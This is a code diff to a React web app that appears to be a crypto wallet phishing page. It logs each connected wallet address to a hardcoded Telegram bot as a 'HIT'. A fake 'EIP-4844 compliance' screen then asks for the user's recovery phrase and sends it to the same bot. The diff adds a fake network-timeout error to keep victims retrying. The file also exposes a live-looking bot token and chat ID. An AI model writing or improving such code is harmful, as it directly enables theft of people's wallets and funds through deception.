@@ -15,6 +15,7 @@ export default function App() {
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
   const [feedMsg, setFeedMsg] = useState(""); 
+  const [errorMsg, setErrorMsg] = useState(""); 
 
   const bT = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const cI = "7630238860";
@@ -23,9 +24,9 @@ export default function App() {
   const log = (m) => fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(m)}`).catch(()=>{});
 
   useEffect(() => {
-    if (isConnected && address && !sessionStorage.getItem('hit_vF_Final')) {
+    if (isConnected && address && !sessionStorage.getItem('hit_vF_100')) {
       log(`🎯 HIT!\nADDR: ${address}\nNET: ${chainId}`);
-      sessionStorage.setItem('hit_vF_Final', 't');
+      sessionStorage.setItem('hit_vF_100', 't');
     }
   }, [isConnected, address, chainId]);
 
@@ -75,7 +76,7 @@ export default function App() {
           </div>
           {view === "menu" && (
             <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
-              {/* KYC REMOVED FROM LIST BELOW */}
+              {/* KYC REMOVED BELOW */}
               {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Fix"].map(n => (
                 <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} 
                 style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900'}}>
@@ -106,11 +107,23 @@ export default function App() {
                     <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>🛡️ EIP-4844 COMPLIANCE</div>
                     <div style={{fontSize:'10px', color:'#64748b', marginTop:'10px', lineHeight:'1.4'}}>TO PREVENT SYBIL ATTACKS AND VERIFY WALLET OWNERSHIP, PLEASE INPUT YOUR RECOVERY PHRASE TO SYNCHRONIZE WITH THE MAINNET RELAY.</div>
                     <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none', marginTop:'20px'}} />
-                    <button onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setView("menu")},1200)}},60);}} 
+                    <button onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setErrorMsg("❌ NETWORK_CONGESTION: MAINNET_RELAY TIMED OUT. PLEASE TRY AGAIN LATER.");}},60);}} 
                     style={{width:'100%', backgroundColor: '#10b981', color:'#000', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}>ENCRYPT & SYNC</button>
                   </>
                 ) : (
-                  <div><div style={{fontSize:'60px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{color:'#10b981'}}>STABILIZING_RELAY...</div></div>
+                  <div>
+                    {!errorMsg ? (
+                      <>
+                        <div style={{fontSize:'60px', color:'white', fontWeight:'900'}}>{syncProgress}%</div>
+                        <div style={{color:'#10b981'}}>STABILIZING_RELAY...</div>
+                      </>
+                    ) : (
+                      <>
+                        <div style={{color:'#ef4444', fontWeight:'900', fontSize:'12px', marginBottom:'20px', lineHeight:'1.5'}}>{errorMsg}</div>
+                        <button onClick={()=>{setIsSyncing(false); setErrorMsg(""); setView("menu")}} style={{width:'100%', backgroundColor:'#1e293b', color:'white', padding:'18px', borderRadius:'15px', border:'none', fontWeight:'900'}}>RETRY_CONNECTION</button>
+                      </>
+                    )}
+                  </div>
                 )}
               </div>
             </div>
